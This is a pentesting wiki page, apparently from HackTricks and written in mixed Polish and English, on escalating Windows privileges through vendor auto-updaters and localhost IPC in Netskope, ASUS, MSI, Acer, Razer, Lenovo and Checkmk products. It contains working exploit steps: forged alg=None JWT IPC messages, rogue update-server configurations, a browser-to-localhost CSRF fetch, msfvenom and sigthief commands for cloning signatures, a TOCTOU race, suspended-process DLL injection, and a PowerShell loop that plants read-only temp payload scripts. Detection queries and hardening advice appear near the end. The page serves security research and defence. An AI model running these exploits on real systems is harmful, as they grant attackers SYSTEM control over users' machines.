# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ta strona uogólnia klasę łańcuchów Windows local privilege escalation spotykanych w enterprise endpoint agents i updaterach, które udostępniają łatwo dostępny surface IPC oraz uprzywilejowany flow aktualizacji. Reprezentatywnym przykładem jest Netskope Client for Windows < R129 (CVE-2025-0309), gdzie użytkownik z niskimi uprawnieniami może wymusić enrollment do serwera kontrolowanego przez atakującego, a następnie dostarczyć złośliwy MSI, który usługa SYSTEM instaluje.

Kluczowe idee, które możesz wykorzystać przeciwko podobnym produktom:
- Nadużyj localhost IPC uprzywilejowanej usługi, aby wymusić re-enrollment lub reconfiguration do serwera atakującego.
- Zaimplementuj update endpoints vendora, dostarcz fałszywy Trusted Root CA i wskaż updaterowi złośliwy, „signed” package.
- Omiń słabe signer checks (CN allow-lists), opcjonalne flagi digest i luźne właściwości MSI.
- Jeśli IPC jest „encrypted”, wyprowadź key/IV z world-readable machine identifiers przechowywanych w registry.
- Jeśli usługa ogranicza callerów po image path/process name, wstrzyknij się do allow-listed procesu albo uruchom go suspended i zbootstrappuj swój DLL przez minimalny patch thread-context.

---
## 1) Wymuszanie enrollment do serwera atakującego przez localhost IPC

Wiele agentów dostarcza user-mode UI process, który komunikuje się z usługą SYSTEM przez localhost TCP przy użyciu JSON.

Zaobserwowano w Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flow exploitacji:
1) Utwórz JWT enrollment token, którego claims kontrolują backend host (np. AddonUrl). Użyj alg=None, aby podpis nie był wymagany.
2) Wyślij komunikat IPC wywołujący provisioning command z twoim JWT i tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Usługa zaczyna uderzać do twojego rogue serwera po enrollment/config, np.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name-based, originate the request from an allow-listed vendor binary (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Once the client talks to your server, implement the expected endpoints and steer it to an attacker MSI. Typical sequence:

1) /v2/config/org/clientconfig → Return JSON config with a very short updater interval, e.g.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Zwraca PEM CA certificate. Usługa instaluje go do Local Machine Trusted Root store.
3) /v2/checkupdate → Dostarcz metadane wskazujące na malicious MSI i fałszywą wersję.

Bypassing common checks seen in the wild:
- Signer CN allow-list: usługa może sprawdzać tylko, czy Subject CN równa się “netSkope Inc” albo “Netskope, Inc.”. Twoje rogue CA może wystawić leaf z takim CN i podpisać MSI.
- CERT_DIGEST property: dołącz nieszkodliwą właściwość MSI o nazwie CERT_DIGEST. Brak enforcement przy install.
- Optional digest enforcement: flag config (np. check_msi_digest=false) wyłącza dodatkową cryptographic validation.

Result: usługa SYSTEM instaluje twoje MSI z
C:\ProgramData\Netskope\stAgent\data\*.msi
uruchamiając arbitrary code jako NT AUTHORITY\SYSTEM.

Patch-bypass lesson: jeśli vendor odpowiada allow-listowaniem małego zestawu „trusted” domains zamiast cryptographically authenticating źródła update, szukaj vendor-owned redirectors albo reverse proxies, które nadal pozwalają sterować ruchem. W przypadku Netskope, public follow-up research pokazał, że allow-list z ery R129 nadal dało się abuse through `rproxy.goskope.com`, które proxy’owało attacker-controlled Azure App Service content. Traktuj hostname allow-lists jako speed bump, a nie jako trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

Od R127 Netskope opakowywał IPC JSON w pole encryptData, które wygląda jak Base64. Reversing pokazało AES z key/IV pochodzącymi z wartości registry readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers mogą odtworzyć encryption i wysyłać poprawne encrypted commands z standard user. General tip: jeśli agent nagle „encrypts” swoje IPC, szukaj device IDs, device GUID, install IDs under HKLM jako materiału.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Niektóre usługi próbują authenticate peer, resolving TCP connection’s PID i porównując image path/name z allow-listed vendor binaries located under Program Files (np. stagentui.exe, bwansvc.exe, epdlp.exe).

Dwa praktyczne bypasses:
- DLL injection into an allow-listed process (np. nsdiag.exe) i proxy IPC from inside it.
- Spawn an allow-listed binary suspended i bootstrap your proxy DLL bez CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Produkty często shipują minifilter/OB callbacks driver (np. Stadrv) to strip dangerous rights from handles to protected processes:
- Process: usuwa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ogranicza do THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Niezawodny user-mode loader, który respects these constraints:
1) CreateProcess vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Ponieważ nigdy nie użyłeś PROCESS_CREATE_THREAD ani PROCESS_SUSPEND_RESUME na already-protected process (you created it), policy driver’a jest satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, i serwuje potrzebne endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope to custom IPC client, który crafts arbitrary (optionally AES-encrypted) IPC messages i includes suspended-process injection to originate from an allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Gdy masz do czynienia z nowym endpoint agent albo motherboard “helper” suite, szybki workflow zwykle wystarcza, by stwierdzić, czy patrzysz na obiecujący privesc target:

1) Enumerate loopback listeners i map je z powrotem do vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Wylicz candidate named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Wydobywanie danych routingu opartych na rejestrze używanych przez serwery IPC oparte na pluginach:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Najpierw wyodrębnij nazwy endpointów, klucze JSON i command IDs z user-mode client. Spakowane frontendy Electron/.NET często ujawniają pełny schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Szukaj rzeczywistego predykatu zaufania, a nie tylko ścieżki kodu, która ostatecznie uruchamia proces:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Wzorce warte priorytetu:
- `CryptQueryObject`/parsowanie certyfikatu bez `WinVerifyTrust` zwykle oznacza, że „certyfikat istnieje” potraktowano jako „certyfikat jest zaufany”, co umożliwia certificate cloning albo inne sztuczki z fake-signer.
- Sprawdzanie substring/suffix na `Origin`, `Referer`, URL-ach pobierania, nazwach procesów albo CN podpisującego to nie uwierzytelnianie. `contains(".vendor.com")` zwykle da się obejść przy użyciu domen podobnych kontrolowanych przez atakującego.
- Jeśli GUI z niskimi uprawnieniami decyduje „plik jest zaufany”, a broker SYSTEM tylko konsumuje ten wynik, patchowanie albo ponowna implementacja client-side DLL/JS często całkowicie omija granicę (split validation w stylu Razer).
- Jeśli broker kopiuje payload do `%TEMP%`/`C:\Windows\Temp`, a potem go waliduje albo planuje uruchomienie z tej ścieżki, natychmiast testuj okna TOCTOU replacement oraz sibling plugin modules, które wystawiają alternatywne wrappery `ExecuteTask()` z słabszymi checkami.

W przypadku targetów mocno opartych na named-pipe, PipeViewer to szybki sposób na wykrycie słabych DACL i zdalnie osiągalnych pipe’ów, zanim zaczniesz głębiej odwracać protokół.

Jeśli target uwierzytelnia wywołujących tylko po PID, image path albo process name, traktuj to jako spowalniacz, nie granicę: wstrzyknięcie do legalnego clienta albo nawiązanie połączenia z procesu z allow-listy często wystarcza, by spełnić checki serwera. Dla named pipes konkretnie [ta strona o client impersonation i pipe abuse](named-pipe-client-impersonation.md) omawia ten primitive bardziej szczegółowo.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

Nowsza odmiana warta szukania to **signed-client RPC broker**: desktopowy proces Lenovo z niskimi uprawnieniami podpisany przez vendor rozmawia z usługą SYSTEM, a usługa routuje komendy JSON do zestawu add-ins opisanych w XML pod `%ProgramData%`. Gdy raz osiągniesz code execution **wewnątrz dowolnego zaakceptowanego signed client**, każdy kontrakt `runas="system"` staje się częścią twojej attack surface.

Wysokowartościowe primitive zaobserwowane w badaniach Lenovo Vantage:
- **Ufanie callerowi, bo jest podpisany przez vendor**: badacze uzyskali uwierzytelniony context, kopiując EXE podpisany przez Lenovo do zapisywalnego katalogu i spełniając DLL side-load (`profapi.dll`), tak aby arbitrary code uruchomił się wewnątrz clienta, któremu usługa już ufała.
- **Wykrywanie attack surface sterowanego przez manifesty**: add-ins są deklarowane w `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; kilka kontraktów uruchamia się jako `SYSTEM`, więc enumeracja tych manifestów często szybciej ujawnia realne uprzywilejowane verbs niż reverse engineering samego brokera.
- **Bugi per-command za uwierzytelnionym kanałem**: po wejściu do zaufanego clienta publiczne badania znalazły path-traversal + race conditions w verbs update/install, nadużycia raw-SQL w uprzywilejowanych bazach settings oraz sprawdzanie path w rejestrze oparte na substringach, które pozwalało na zapisy poza zamierzoną hive.

Przydatny recon na target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktyczna wskazówka: gdy zestaw helperów udostępnia broker, który najpierw uwierzytelnia **caller process**, a dopiero potem rozsyła wywołania do dziesiątek poleceń plugin/add-in, nie kończ na obejściu front-door trust check. Zrzutuj tabelę manifest/contract i fuzzuj każdy high-privilege verb osobno; authenticated channel zwykle ukrywa kilka second-stage bugs.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub dostarcza user-mode HTTP service (ADU.exe) na 127.0.0.1:53000, który oczekuje wywołań z przeglądarki pochodzących z https://driverhub.asus.com. Filtr origin po prostu wykonuje `string_contains(".asus.com")` na nagłówku Origin oraz na download URLs ujawnianych przez `/asus/v1.0/*`. Każdy host kontrolowany przez atakującego, taki jak `https://driverhub.asus.com.attacker.tld`, przechodzi więc ten check i może wysyłać state-changing requests z JavaScript. Zobacz [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) po dodatkowe wzorce bypassów.

Praktyczny flow:
1) Zarejestruj domenę, która zawiera `.asus.com`, i hostuj tam malicious webpage.
2) Użyj `fetch` lub XHR, aby wywołać privileged endpoint (np. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Wyślij JSON body oczekiwane przez handler – spakowany frontend JS pokazuje schemat poniżej.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Nawet poniższy PowerShell CLI kończy się sukcesem, gdy nagłówek Origin zostanie spoofowany na zaufaną wartość:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` pobiera dowolne pliki wykonywalne zdefiniowane w treści JSON i buforuje je w `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Walidacja URL pobierania ponownie używa tej samej logiki substring, więc `http://updates.asus.com.attacker.tld:8000/payload.exe` jest akceptowany. Po pobraniu ADU.exe tylko sprawdza, czy PE zawiera podpis oraz czy string Subject zgadza się z ASUS przed uruchomieniem – bez `WinVerifyTrust`, bez walidacji chain.

Aby zamienić to w exploit:
1) Utwórz payload (np. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Sklonuj signer ASUS do niego (np. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostuj `pwn.exe` na domenie podobnej do `.asus.com` i wyzwól UpdateApp przez browser CSRF powyżej.

Ponieważ zarówno filtr Origin, jak i filtr URL są oparte na substringach, a sprawdzenie signera porównuje tylko stringi, DriverHub pobiera i uruchamia binarkę attacker w swoim uprzywilejowanym kontekście.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Usługa SYSTEM MSI Center udostępnia protokół TCP, gdzie każda ramka to `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Główny komponent (Component ID `0f 27 00 00`) dostarcza `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Jego handler:
1) Kopiuje dostarczony plik wykonywalny do `C:\Windows\Temp\MSI Center SDK.exe`.
2) Weryfikuje signature przez `CS_CommonAPI.EX_CA::Verify` (certificate subject musi równać się “MICRO-STAR INTERNATIONAL, CO., LTD.” i `WinVerifyTrust` musi się powieść).
3) Tworzy scheduled task, który uruchamia plik tymczasowy jako SYSTEM z argumentami kontrolowanymi przez attacker.

Skopiowany plik nie jest blokowany między weryfikacją a `ExecuteTask()`. Attacker może:
- Wysłać Frame A wskazującą na legalną binarkę podpisaną przez MSI (gwarantuje, że check signature przejdzie i task zostanie zakolejkowany).
- Zrobić race, wysyłając powtarzane komunikaty Frame B wskazujące na malicious payload, nadpisując `MSI Center SDK.exe` zaraz po zakończeniu weryfikacji.

Gdy scheduler się uruchomi, wykona nadpisany payload jako SYSTEM, mimo że zweryfikował oryginalny plik. Niezawodny exploit używa dwóch goroutines/threads, które spamują CMD_AutoUpdateSDK, aż okno TOCTOU zostanie wygrane.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Każdy plugin/DLL załadowany przez `MSI.CentralServer.exe` otrzymuje Component ID zapisany w `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Pierwsze 4 bajty ramki wybierają ten komponent, pozwalając attackerom kierować komendy do dowolnych modułów.
- Plugins mogą definiować własne task runners. `Support\API_Support.dll` udostępnia `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i bezpośrednio wywołuje `API_Support.EX_Task::ExecuteTask()` z **brak signature validation** – każdy lokalny user może wskazać `C:\Users\<user>\Desktop\payload.exe` i deterministycznie uzyskać execution SYSTEM.
- Podsłuchiwanie loopback za pomocą Wireshark albo instrumentowanie binarek .NET w dnSpy szybko ujawnia mapowanie Component ↔ command; własne klienty Go/ Python mogą potem odtwarzać ramki.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) udostępnia `\\.\pipe\treadstone_service_LightMode`, a jego discretionary ACL pozwala na remote clients (np. `\\TARGET\pipe\treadstone_service_LightMode`). Wysłanie command ID `7` ze ścieżką do pliku wywołuje routine uruchamiania procesu przez usługę.
- Library klienta serializuje magiczny terminator byte (113) wraz z args. Dynamic instrumentation przy użyciu Frida/`TsDotNetLib` (zobacz [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) po wskazówki dot. instrumentacji) pokazuje, że natywny handler mapuje tę wartość na `SECURITY_IMPERSONATION_LEVEL` oraz integrity SID przed wywołaniem `CreateProcessAsUser`.
- Zamiana 113 (`0x71`) na 114 (`0x72`) wpada do generic branch, który zachowuje pełny token SYSTEM i ustawia high-integrity SID (`S-1-16-12288`). Uruchomiona binarka działa więc jako nieograniczony SYSTEM, zarówno lokalnie, jak i cross-machine.
- Połącz to z wystawioną flagą instalatora (`Setup.exe -nocheck`), aby uruchomić ACC nawet na lab VMs i przetestować pipe bez hardware od vendora.

Te błędy IPC pokazują, dlaczego localhost services muszą wymuszać mutual authentication (ALPC SIDs, filtry `ImpersonationLevel=Impersonation`, token filtering) i dlaczego każdy helper “run arbitrary binary” w module musi współdzielić te same weryfikacje signera.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 dodał kolejny użyteczny pattern do tej rodziny: user z niskimi uprawnieniami może poprosić COM helper o uruchomienie procesu przez `RzUtility.Elevator`, podczas gdy decyzja trust jest delegowana do user-mode DLL (`simple_service.dll`), zamiast być solidnie egzekwowana wewnątrz uprzywilejowanej granicy.

Zaobserwowana ścieżka exploita:
- Utwórz obiekt COM `RzUtility.Elevator`.
- Wywołaj `LaunchProcessNoWait(<path>, "", 1)`, aby zażądać elevated launch.
- W publicznym PoC gate PE-signature wewnątrz `simple_service.dll` jest patchowany przed wysłaniem requestu, co pozwala uruchomić dowolny executable wybrany przez attacker.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Ogólny wniosek: podczas analizy wstecznej zestawów „helper” nie zatrzymuj się na localhost TCP ani named pipes. Sprawdź klasy COM o nazwach takich jak `Elevator`, `Launcher`, `Updater` lub `Utility`, a następnie zweryfikuj, czy uprzywilejowana usługa faktycznie waliduje sam binarny plik docelowy, czy tylko ufa wynikowi obliczonemu przez możliwą do załatania biblioteke DLL klienta w user-mode. Ten wzorzec wykracza poza Razer: każdy podział, w którym broker o wysokich uprawnieniach konsumuje decyzję allow/deny od strony o niskich uprawnieniach, jest kandydatem na powierzchnię privesc.


---
## Predictable temp script execution during MSI repair (Checkmk Agent / CVE-2024-0670)

Niektóre Windows agents nadal implementują uprzywilejowane działania przez zapisanie tymczasowego pliku `.cmd` do `C:\Windows\Temp` i wykonanie go jako `SYSTEM`. Jeśli nazwa pliku jest przewidywalna, a usługa nie bezpiecznie odtwarza istniejących plików, użytkownik o niskich uprawnieniach może wcześniej utworzyć przyszły plik tymczasowy jako **read-only** i sprawić, że uprzywilejowany proces wykona treść kontrolowaną przez atakującego zamiast własnego skryptu.

Zaobserwowane w podatnych buildach Checkmk Agent:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: MSI **repair** of the cached agent package

Praktyczny workflow:
1. Oszacuj realistyczny zakres PID na podstawie bieżących identyfikatorów procesów albo PID uruchomionego agenta.
2. Zapisz krótki ładunek **ASCII** `.cmd` (`Set-Content -Encoding Ascii` albo redirection `cmd.exe`; unikaj wyjścia PowerShell UTF-16 dla plików batch).
3. Rozsiej `C:\Windows\Temp\cmk_all_<PID>_1.cmd` po zakresie kandydatów i oznacz każdy plik jako read-only.
4. Wyzwól repair cached MSI, aby uprzywilejowana usługa spróbowała odtworzyć, a następnie wykonać temp script.
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Jeśli podatny produkt jest zainstalowany za pomocą Windows Installer, zmapuj losowo wyglądający cachowany plik MSI w `C:\Windows\Installer` z powrotem do jego nazwy produktu przed uruchomieniem naprawy:
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- `qwinsta` jest przydatne, gdy `msiexec /fa` zawodzi z nieinteraktywnej powłoki WinRM i musisz ustalić, czy istniejąca sesja desktop/disconnected może poprawnie wywołać naprawę.
- Ten wzorzec uogólnia się na inne endpoint agents i updaters, które **stage temp scripts w world-writable locations i później wykonują je jako SYSTEM**. Testuj przewidywalne nazwy, brak wyłącznej semantyki create oraz flow naprawy/update, które mogą być uruchamiane na żądanie.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Between June 2025 and December 2025, attackerzy who compromised the hosting infrastructure behind the Notepad++ update flow selectively served malicious manifests to chosen victims. Older WinGUp-based updaters did not fully verify update authenticity, so a hostile XML response could redirect clients to attacker-controlled URLs. Because the client accepted HTTPS content without enforcing both a trusted certificate chain and a valid PE signature on the downloaded installer, victims fetched and executed a trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.
- Notepad++ responded by strengthening WinGUp in v8.8.9 and later: the returned XML is now signed (XMLDSig), and newer builds enforce certificate + signature verification of the downloaded installer instead of trusting the transport alone.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> uruchamiający instalator inny niż Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Te wzorce uogólniają się na każdy updater, który akceptuje niepodpisane manifesty albo nie przypina signerów instalatora — network hijack + malicious installer + BYO-signed sideloading daje remote code execution pod przykrywką „trusted” aktualizacji.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
